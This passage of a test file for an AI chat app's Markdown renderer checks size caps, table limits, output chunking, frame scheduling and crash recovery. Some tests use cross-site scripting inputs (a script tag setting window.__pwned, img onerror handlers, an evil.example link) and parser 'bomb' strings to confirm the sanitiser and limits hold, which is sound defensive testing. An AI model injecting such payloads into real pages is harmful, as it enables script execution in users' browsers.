    expect(htmlOf(block.parts)).toContain("|-|");
  });

  it.each([
    ["block over the formatted cap", "a".repeat(MAX_PARSED_CHARS + 1), "size"],
    [
      "deep list stair",
      Array.from({ length: 100 }, (_, i) => `${" ".repeat(i * 2)}- a`).join("\n"),
      "nesting",
    ],
  ])("never parses a %s; it is text by shape (W2)", (_name, text, risk) => {
    expect(riskOf(text)).toBe(risk);
    const block = render(text);
    expect(block.plain).toBe(true);
  });

  it("replaces a render that outgrows its input with the text (X1)", () => {
    const bomb = "[a]: https://e.com/" + "x".repeat(1_500) + "\n\n" + "[a] ".repeat(3_000);
    const started = performance.now();
    const block = render(bomb);
    expect(performance.now() - started).toBeLessThan(1_000);
    expect(block.plain).toBe(true);
    expect(block.parts[0].kind).toBe("text");
  });

  it("renders a link or image over the URL cap as text (X1)", () => {
    const long = "https://e.com/" + "x".repeat(MAX_URL_CHARS);
    const html = htmlOf(
      render(`[go](${long}) and ![i](data:image/png;base64,${"A".repeat(MAX_URL_CHARS)})`).parts,
    );
    expect(html).not.toContain("<a ");
    expect(html).not.toContain("<img");
  });

  it("keeps list nesting and numbering in Copy answer (X10)", () => {
    expect(markdownToPlainText("- a\n  - b\n  - c\n- d")).toBe("- a\n  - b\n  - c\n- d");
    expect(markdownToPlainText("3. one\n4. two")).toBe("3. one\n4. two");
    expect(markdownToPlainText("- item\n\n  second para")).toBe("- item\n  second para");
  });

  it("puts a <wbr> into every long run of prose and inline code, never inside an entity", () => {
    const run = "&".repeat(200);
    const html = htmlOf(render(`See ${run} and \`${"b".repeat(100)}\``).parts);
    mountHtml(html);
    expect(document.body.textContent).toContain(run);
    expect(html.match(/<wbr>/g)?.length).toBeGreaterThanOrEqual(4);
    expect(html).not.toMatch(/&a?m?p?<wbr>/);
  });

  it("breaks a long run in a table cell with <wbr> (Y8)", () => {
    const html = htmlOf(render(`| a |\n|---|\n| ${"c".repeat(2_000)} |`).parts);
    expect(html).toContain("<td>");
    expect(html.match(/<wbr>/g)?.length).toBeGreaterThanOrEqual(2_000 / MAX_RUN_CHARS - 1);
    mountHtml(html);
    expect(document.body.textContent).toContain("c".repeat(2_000));
  });

  it.each([
    ["an HTML block", "<div>" + "a".repeat(5_000) + "</div>"],
    ["a run of many inline code spans", "`a`b".repeat(1_000)],
    ["a run of escapes", "a\\*".repeat(2_000)],
    ["a run joined by NBSP", "a\u00a0".repeat(2_000)],
  ])("puts a <wbr> into %s, counted across tokens (Y8)", (_name, text) => {
    const html = htmlOf(parse(text).parts);
    const visible = mountHtml(html).text().replace(/\s/g, "").length;
    expect(html.match(/<wbr>/g)?.length ?? 0).toBeGreaterThanOrEqual(visible / MAX_RUN_CHARS - 2);
  });

  it("adds no newline to the code of a completed block with an unclosed fence (X11)", () => {
    expect(codeOf(render("```\nlast line").parts)).toEqual(["last line"]);
  });

  it("lets a normal table, list and emphasis through the shape check", () => {
    expect(
      riskOf("| a | b |\n|---|---|\n| 1 | 2 |\n\n- one\n  - two\n\nSome **bold** and *em*."),
    ).toBeNull();
  });

  it("caps a 200k bomb behind an over-indented fence closer (F10)", () => {
    const bomb = "```x\n    ```\n```\n" + "*a ".repeat(MAX_PARSED_CHARS / 3 - 10);
    const started = performance.now();
    const { parts } = render(bomb);
    expect(performance.now() - started).toBeLessThan(1_000);
    expect(parts.length).toBeGreaterThan(0);
  });

  it("keeps code after an over-indented non-closer exactly as sent (F10, V2)", () => {
    const code = "```\n    ```\n" + "ls *.log *.gz *.txt *.a *.b *.c *.d *.e *.f *.g\n```\n";
    expect(codeOf(render(code).parts)).toEqual([
      "    ```\nls *.log *.gz *.txt *.a *.b *.c *.d *.e *.f *.g",
    ]);
  });

  const GLOBS = "ls *.log *.gz *.txt *.a *.b *.c *.d *.e *.f *.g";

  it.each([
    [
      "a multi-line code span",
      "Delete them with `find . -name\n" + GLOBS.replace("ls ", "") + "` now.",
    ],
    ["an indented code block", "Run this:\n\n    " + GLOBS + "\n"],
    ["a fence in a blockquote", "> ```bash\n> " + GLOBS + "\n> ```\n"],
    ["a fence in a list in a quote", "> 1. step\n>    ```bash\n>    " + GLOBS + "\n>    ```\n"],
  ])("never rewrites %s; the guard only decides parse or plain (W3)", (_name, text) => {
    mountHtml(htmlOf(render(text).parts));
    const shown = [...document.body.querySelectorAll("code")].map((el) => el.textContent).join(" ");
    const code = codeOf(render(text).parts).join(" ");
    expect(`${shown} ${code}`).toContain("*.log *.gz");
    expect(`${shown} ${code}`).not.toContain("&#42;");
  });

  it("keeps lists and paragraphs inside a blockquote in Copy answer (W3)", () => {
    expect(markdownToPlainText("> - first\n> - second")).toBe("- first\n- second");
    expect(markdownToPlainText("> para one\n>\n> para two")).toBe("para one\n\npara two");
  });

  it("never edits code in a fence nested in a list item (V2)", () => {
    const code = [
      "ls *.log *.gz *.txt *.a *.b *.c *.d *.e *.f *.g",
      `${" ".repeat(60)}deep: 1`,
    ].join("\n");
    const nested = code
      .split("\n")
      .map((line) => `      ${line}`)
      .join("\n");
    const answer = `1. Clean up:\n   - Remove old files:\n     \`\`\`bash\n${nested}\n     \`\`\`\n`;
    mountHtml(htmlOf(render(answer).parts));
    const shown = document.body.querySelector("code")?.textContent ?? "";
    expect(shown).toContain("ls *.log *.gz *.txt *.a *.b *.c *.d *.e *.f *.g");
    expect(shown).toContain(`${" ".repeat(60)}deep: 1`);
    expect(markdownToPlainText(answer)).toContain("ls *.log *.gz");
  });

  it("keeps the text of a raw HTML block and drops its tags and script (F9)", () => {
    const html = htmlOf(
      render("<div>\nImportant finding\n</div>\n\n<script>window.__pwned = 1</script>\n\nafter")
        .parts,
    );
    mountHtml(html);
    expect(document.body.textContent).toContain("Important finding");
    expect(document.body.textContent).not.toContain("__pwned");
    expect(html).not.toContain("<div");
  });

  it("never puts raw HTML in a table cell or in Copy answer (V3)", () => {
    const html = htmlOf(
      render('| a |\n|---|\n| <img src=x onerror="window.__pwned=1"> ok |').parts,
    );
    expect(html).toContain("<td>");
    expect(html).not.toContain("<img");
    expect(
      markdownToPlainText('See <a href="https://evil.example" target="_self">same tab</a> ok'),
    ).toBe("See same tab ok");
  });

  it("shows entities inside inline code as typed (V4)", () => {
    mountHtml(htmlOf(render("Use `&lt;b&gt;` and `a &amp; b`.").parts));
    expect(document.body.textContent).toContain("&lt;b&gt;");
    expect(document.body.textContent).toContain("a &amp; b");
    expect(markdownToPlainText("Use `&lt;b&gt;`.")).toBe("Use &lt;b&gt;.");
  });

  it("leaves code lines alone when bounding indentation and quotes (S9)", () => {
    const deep = `${" ".repeat(60)}"leaf": 1`;
    const quotes = ">>>>>>>>>> merge marker";
    expect(codeOf(render(`\`\`\`json\n${deep}\n${quotes}\n\`\`\``).parts)).toEqual([
      `${deep}\n${quotes}`,
    ]);
  });

  it("keeps only the latest streamed prefix, never one memo entry per delta (S12)", () => {
    const before = markdownParseCount();
    const first = renderMarkdown("s12:0", "Hello", "open");
    expect(renderMarkdown("s12:0", "Hello", "open")).toBe(first);
    renderMarkdown("s12:0", "Hello there", "open");
    renderMarkdown("s12:0", "Hello", "open");
    expect(markdownParseCount() - before).toBe(3);
  });

  it.each([
    ["rows after a tab-only line", table(2, 1) + "\t\n".repeat(2_400)],
    ["rows after an NBSP-only line", table(2, 1) + "\u00a0\n".repeat(2_400)],
    ["rows after a form-feed line", table(2, 1) + "\f\n".repeat(2_400)],
    ["a one-column header without a pipe", "h\n:-\n" + "a\n".repeat(2_400)],
    ["two tables that pass the cap together", (table(2, 600) + "\n").repeat(2)],
    ["a table in a quote", table(1, 2_050).replace(/^/gm, "> ")],
  ])(
    "counts the cells of %s with marked's own rule and makes the block text (Y1)",
    (_name, text) => {
      expect(text.length).toBeLessThanOrEqual(MAX_PARSED_CHARS);
      const started = performance.now();
      const result = parse(text);
      expect(performance.now() - started).toBeLessThan(500);
      expect(result.rejected).toBe("table");
      expect(result.parts.every((part) => part.kind === "text")).toBe(true);
    },
  );

  it("renders a table at the cell cap as plain cells", () => {
    const rows = MAX_TABLE_CELLS / 10 - 1;
    const result = parse(table(10, rows));
    expect(result.rejected).toBeUndefined();
    expect(htmlOf(result.parts).match(/<td>/g)).toHaveLength(10 * rows);
  });

  it("shows a block over the formatted cap as text, and Copy still gives all of it", () => {
    const text = "**a** ".repeat(MAX_PARSED_CHARS / 6 + 1);
    const result = parse(text);
    expect(result.rejected).toBe("size");
    expect(result.parts.map((part) => (part as { text: string }).text).join("")).toBe(text);
    expect(markdownToPlainText(text)).toBe(text);
  });

  it.each([
    ["list", "- a\n".repeat(4_990)],
    ["ordered list", "1. item\n".repeat(2_400)],
    ["run of paragraphs", "a\n\n".repeat(6_600)],
    ["run of line breaks", "a\n".repeat(9_990)],
    ["single paragraph", "word ".repeat(3_990)],
    ["table", table(2, 999)],
    ["run of inline code", "`a`b".repeat(4_990)],
    ["quote", "> a\n>\n".repeat(3_300)],
  ])(
    "cuts the HTML of a long %s into parts of at most PART_CHARS that read as one (Y2, F15)",
    (_name, text) => {
      const { parts, rejected } = parse(text);
      expect(rejected).toBeUndefined();
      expect(parts.length).toBeGreaterThan(1);
      const html = parts.map((part) => (part.kind === "html" ? part.html : ""));
      for (const piece of html) {
        expect(piece.length).toBeLessThanOrEqual(PART_CHARS);
        expect(piece.match(/<[a-z]/g)?.length ?? 0).toBeLessThanOrEqual(PART_TAGS + 8);
      }
      for (const piece of html) {
        const open = piece.match(/<(?!\/|br|wbr|hr|img)[a-z0-9]+/g)?.length ?? 0;
        expect(piece.match(/<\/[a-z0-9]+>/g)?.length ?? 0).toBe(open);
      }
      const visible = (markup: string) => markup.replace(/<[^>]*>/g, "").replace(/\s/g, "");
      const unsplit = new Marked({ gfm: true, breaks: true }).parse(text) as string;
      expect(visible(html.join(""))).toBe(visible(unsplit));
    },
  );

  it("numbers an ordered list on across its parts", () => {
    const { parts } = parse("1. item\n".repeat(2_400));
    let shown = 0;
    for (const part of parts as Extract<MarkdownPart, { kind: "html" }>[]) {
      const start = Number(/^<ol(?: start="(\d+)")?>/.exec(part.html)?.[1] ?? 1);
      const continued = part.html.includes('<li class="list-none">');
      expect(start).toBe(shown + (continued ? 0 : 1));
      shown += part.html.match(/<li>/g)?.length ?? 0;
    }
    expect(shown).toBe(2_400);
  });

  it("cuts a text fallback into parts of at most PART_CHARS and PART_LINES", () => {
    const text = "a\n".repeat(20_000) + "b".repeat(20_000);
    const { parts } = plainResult("t", text);
    const texts = parts.map((part) => (part as { text: string }).text);
    expect(texts.join("")).toBe(text);
    for (const piece of texts) {
      expect(piece.length).toBeLessThanOrEqual(PART_CHARS);
      expect(piece.split("\n").length - 1).toBeLessThanOrEqual(PART_LINES);
    }
  });

  it("stops a render once its output budget is spent, before building the rest (Y7)", () => {
    const text = "[a]: https://e.com/" + "x".repeat(2_000) + "\n\n" + "[a] ".repeat(4_400);
    const started = performance.now();
    const result = parse(text);
    expect(performance.now() - started).toBeLessThan(500);
    expect(result.rejected).toBe("output");
  });

  // A stand-in IntersectionObserver: the spec says how far each part is, and counts the observers alive.
  function fakeObserver() {
    const seen: { target: Element; callback: IntersectionObserverCallback }[] = [];
    const alive = new Set<object>();
    class FakeObserver {
      constructor(private callback: IntersectionObserverCallback) {
        alive.add(this);
      }
      observe(target: Element) {
        seen.push({ target, callback: this.callback });
      }
      unobserve(target: Element) {
        seen.splice(
          seen.findIndex((item) => item.target === target),
          1,
        );
      }
      disconnect() {
        alive.delete(this);
      }
    }
    vi.stubGlobal("IntersectionObserver", FakeObserver);
    const at = (target: Element, distance: number) => {
      const entry = seen.find((item) => item.target === target)!;
      const top = distance ? 900 + distance : 100;
      entry.callback(
        [
          {
            target,
            isIntersecting: distance === 0,
            boundingClientRect: { top, bottom: top + 10 },
            rootBounds: { top: 0, bottom: 900, height: 900 },
          } as unknown as IntersectionObserverEntry,
        ],
        {} as IntersectionObserver,
      );
    };
    return { at, alive, seen };
  }

  function frameStub() {
    const frames: FrameRequestCallback[] = [];
    vi.stubGlobal("Worker", class {});
    // The setup file's observer never fires; without one every part counts as near.
    vi.stubGlobal("IntersectionObserver", undefined);
    vi.stubGlobal("requestAnimationFrame", (callback: FrameRequestCallback) =>
      frames.push(callback),
    );
    // A frozen clock keeps the time slice from ending a frame on a loaded machine; these specs weigh parts by size.
    const clock = vi.spyOn(performance, "now").mockReturnValue(0);
    onTestFinished(() => clock.mockRestore());
    const run = () => {
      const pending = frames.splice(0);
      pending.forEach((frame) => frame(0));
      return pending.length;
    };
    return { run };
  }

  it("fills every part once: the live answer first, then the nearest, far parts too (Z3, Q1)", async () => {
    const { run } = frameStub();
    const { at } = fakeObserver();
    const big = `<p>${"b".repeat(PART_CHARS - 20)}</p>`;
    const part = (key: string, html: string) => ({ kind: "html" as const, key, html });
    const wrapper = mount(
      defineComponent({
        setup: () => () =>
          h("div", [
            h(AssistantMarkdownPart, { part: part("far", "<p><em>far</em></p>") }),
            h(AssistantMarkdownPart, { part: part("small", "<p><em>small</em></p>") }),
            h(AssistantMarkdownPart, { part: part("big", big) }),
            h(AssistantMarkdownPart, {
              part: part("live", '<p><em>live</em><img src=x onerror="alert(1)"></p>'),
              live: true,
            }),
          ]),
      }),
    );
    const parts = wrapper.findAllComponents(AssistantMarkdownPart).map((c) => c.element);
    expect(wrapper.findAll("em")).toHaveLength(0);
    expect(wrapper.text()).toBe("");
    expect(parts.every((node) => node.hasAttribute("data-pending"))).toBe(true);
    at(parts[0], 5_000);
    at(parts[1], 400);
    at(parts[2], 0);
    run();
    expect(wrapper.findAll("em").map((em) => em.text())).toEqual(["live"]);
    expect(wrapper.findAll("img")).toHaveLength(0);
    run();
    expect(parts[2].querySelector("p")?.textContent).toHaveLength(PART_CHARS - 20);
    expect(parts[1].querySelector("em")).toBeNull();
    run();
    expect(parts[1].querySelector("em")?.textContent).toBe("small");
    expect(parts[0].querySelector("em")?.textContent).toBe("far");
    expect(run()).toBe(0);
  });

  it("makes the next slice smaller after a frame that cost more than its budget, style and layout included (Q1)", () => {
    const frames: FrameRequestCallback[] = [];
    vi.stubGlobal("Worker", class {});
    vi.stubGlobal("IntersectionObserver", undefined);
    vi.stubGlobal("requestAnimationFrame", (callback: FrameRequestCallback) =>
      frames.push(callback),
    );
    const wrapper = mount(
      defineComponent({
        setup: () => () =>
          h(
            "div",
            Array.from({ length: 40 }, (_, i) =>
              h(AssistantMarkdownPart, {
                part: { kind: "html", key: `${i}`, html: `<p><em>${"x".repeat(400)}</em></p>` },
              }),
            ),
          ),
      }),
    );
    // The 8 ms script cap stays out of it: only the frame-to-frame time sizes the slices here.
    const clock = vi.spyOn(performance, "now").mockReturnValue(0);
    onTestFinished(() => clock.mockRestore());
    const filled = () => wrapper.findAll("em").length;
    let now = 0;
    const frame = (gap: number) => {
      now += gap;
      const before = filled();
      frames.splice(0).forEach((callback) => callback(now));
      return filled() - before;
    };
    const first = frame(16);
    expect(first).toBe(19);
    // A 200 ms frame: about a sixth of the characters next time.
    const slow = frame(200);
    expect(slow).toBeLessThan(first / 4);
    expect(frame(200)).toBe(1);
    // Cheap frames win the size back step by step.
    const sizes = [frame(16), frame(16), frame(16)];
    expect(sizes[2]).toBeGreaterThan(sizes[0]);
    while (frames.length) frame(16);
    expect(filled()).toBe(40);
  });

  it("releases each scroll container's observer with its last part: 12 mounts and unmounts leave none (F18, Q2)", () => {
    frameStub();
    const { alive, seen } = fakeObserver();
    const Transcript = defineComponent({
      setup: () => () =>
        h(
          "section",
          { "data-transcript-scroll": "" },
          Array.from({ length: 6 }, (_, i) =>
            h(AssistantMarkdownPart, {
              part: { kind: "html", key: `${i}`, html: `<p>${i}</p>` },
            }),
          ),
        ),
    });
    for (let cycle = 0; cycle < 12; cycle++) {
      const wrapper = mount(Transcript, { attachTo: document.body });
      expect(alive.size).toBe(1);
      expect(seen).toHaveLength(6);
      wrapper.unmount();
      expect(alive.size).toBe(0);
      expect(seen).toHaveLength(0);
    }
  });

  it("weighs small parts so several share a frame (Z3)", () => {
    const { run } = frameStub();
    const wrapper = mount(
      defineComponent({
        setup: () => () =>
          h(
            "div",
            Array.from({ length: 5 }, (_, i) =>
              h(AssistantMarkdownPart, {
                part: { kind: "html", key: `${i}`, html: `<p><em>${i}</em></p>` },
              }),
            ),
          ),
      }),
    );
    expect(run()).toBe(1);
    expect(wrapper.findAll("em")).toHaveLength(5);
  });

  it("keeps a part's old content until its slice when it changes, then fills it once (Q1)", async () => {
    const { run } = frameStub();
    const wrapper = mount(AssistantMarkdownPart, {
      props: { part: { kind: "text", key: "k", text: "**a**" }, htmlClass: "h", textClass: "t" },
    });
    expect(wrapper.html()).toBe('<div data-pending=""></div>');
    run();
    expect(wrapper.html()).toContain('class="t" data-test="assistant-block-plain"');
    await wrapper.setProps({ part: { kind: "html", key: "k", html: "<p><strong>a</strong></p>" } });
    expect(wrapper.text()).toBe("**a**");
    run();
    expect(wrapper.find("strong").text()).toBe("a");
    expect(wrapper.attributes("class")).toBe("h");
    expect(wrapper.attributes("data-test")).toBeUndefined();
    expect(run()).toBe(0);
  });

  it("shows a code block as plain <pre> text and upgrades it in a later slice (Z2)", async () => {
    const { run } = frameStub();
    const wrapper = mount(AssistantMarkdownCode, {
      props: { code: "SELECT 1", weight: 8 },
      slots: { default: () => h("div", { class: "rich" }, "rich") },
    });
    expect(wrapper.find("pre").text()).toBe("SELECT 1");
    expect(wrapper.find(".rich").exists()).toBe(false);
    run();
    await nextTick();
    expect(wrapper.find(".rich").exists()).toBe(true);
    expect(wrapper.find("pre").exists()).toBe(false);
  });

  // A reload of the same tab keeps its sessionStorage; a crash fires no pagehide.
  const reloadTab = (opts: { crashed: boolean }) => {
    if (!opts.crashed) window.dispatchEvent(new Event("pagehide"));
    resetMarkdownForTests({ reload: true });
  };

  const markerOf = () => JSON.parse(sessionStorage.getItem(PARSING_KEY) ?? "null");

  it("marks only the block the worker started, and a normal reload marks nothing (Q3)", async () => {
    const { parser, calls, start } = manualParser();
    setMarkdownParserForTests(parser);
    for (let i = 0; i < 3; i++) renderMarkdown(`q3:${i}`, `Block **${i}**`, "closed");
    await flush();
    expect(calls).toHaveLength(3);
    expect(markerOf().key).toBeNull();
    start(0);
    const text = calls[0].request.text;
    expect(markerOf().key).toBe(`${text.length}:${contentHash(text)}`);
    expect(localStorage.getItem(PARSING_KEY)).toBeNull();
    reloadTab({ crashed: false });
    setMarkdownParserForTests(syncMarkdownParserForTests);
    for (let i = 0; i < 3; i++)
      expect(renderMarkdown(`q3:${i}`, `Block **${i}**`, "closed").plain).toBe(false);
  });

  it("never blames a slow worker load, and a second tab neither reads nor clears the first tab's marker (Q3)", async () => {
    const { parser, calls } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("q3:slow", "Slow **load**", "closed");
    await flush();
    expect(calls).toHaveLength(1);
    // The worker has not said it started: nothing is in flight.
    expect(markerOf().key).toBeNull();
    calls[0].events.start(calls[0].index);
    const tabA = sessionStorage.getItem(PARSING_KEY);
    // Tab B: its own sessionStorage, the same localStorage.
    sessionStorage.clear();
    resetMarkdownForTests({ reload: true });
    setMarkdownParserForTests(syncMarkdownParserForTests);
    expect(renderMarkdown("q3:slow", "Slow **load**", "closed").plain).toBe(false);
    expect(localStorage.getItem(KNOWN_BAD_KEY)).toBeNull();
    expect(JSON.parse(tabA!).key).not.toBeNull();
  });

  it("shows a block as text only after two crashes in a row with it in flight, and forgets it after 30 days (Q3)", async () => {
    const text = "A **crashing** answer";
    const crashWhileParsing = async () => {
      const { parser, calls, start } = manualParser();
      setMarkdownParserForTests(parser);
      const block = renderMarkdown("q3:c", text, "closed");
      await flush();
      expect(block.plain).toBe(false);
      expect(calls).toHaveLength(1);
      start(0);
      reloadTab({ crashed: true });
    };
    await crashWhileParsing();
    // First crash: the block is a suspect, and parses again.
    await crashWhileParsing();
    const { parser, calls } = manualParser();
    setMarkdownParserForTests(parser);
    expect(renderMarkdown("q3:c", text, "closed").plain).toBe(true);
    await flush();
    expect(calls).toHaveLength(0);
    vi.useFakeTimers({ now: Date.now() + 31 * 24 * 60 * 60 * 1_000 });
    reloadTab({ crashed: false });
    setMarkdownParserForTests(syncMarkdownParserForTests);
    expect(renderMarkdown("q3:c", text, "closed").plain).toBe(false);
  });

  it("clears a suspect that parses without a crash, so one crash never adds up with a later one (Q3)", async () => {
    const text = "Once **suspect**";
    const { parser, start } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("q3:s", text, "closed");
    await flush();
    start(0);
    reloadTab({ crashed: true });
    setMarkdownParserForTests(syncMarkdownParserForTests);
    expect(renderMarkdown("q3:s", text, "closed").plain).toBe(false);
    expect(markerOf()).toMatchObject({ key: null, suspect: null, strikes: 0 });
  });

  it("keeps a mounted block's version however many other blocks render, and Copy makes none (F16)", async () => {
    const { parser, calls, answer } = manualParser();
    setMarkdownParserForTests(parser);
    const Message = defineComponent({
      setup() {
        const renderBlock = useRenderedMarkdown();
        return () =>
          h(
            "div",
            renderBlock("f16:0", "Hello **there**", "closed").parts.map((part) => part.kind),
          );
      },
    });
    const wrapper = mount(Message);
    expect(wrapper.text()).toBe("text");
    for (let i = 0; i < 1_000; i++) {
      renderMarkdown(`other:${i}`, `x ${i}`, "closed");
      void markdownToPlainText(`copy ${i}`);
    }
    await flush();
    // Newest blocks parse first, so the held block's job comes after the others' batches.
    let answered = 0;
    while (!calls.some((call) => call.request.blockId === "f16:0")) {
      while (answered < calls.length) answer(answered++);
      await flush();
    }
    answer(calls.findIndex((call) => call.request.blockId === "f16:0"));
    await flush();
    expect(wrapper.text()).toBe("html");
    wrapper.unmount();
  });

  it("gives the plain text of an answer without Markdown syntax (EB-09 AC 5)", () => {
    expect(
      markdownToPlainText(
        "## Title\n\nSome **bold** and `code` [link](https://x.io) [^call_1].\n\n- a\n- b",
      ),
    ).toBe("Title\n\nSome bold and code link.\n\n- a\n- b");
  });
});
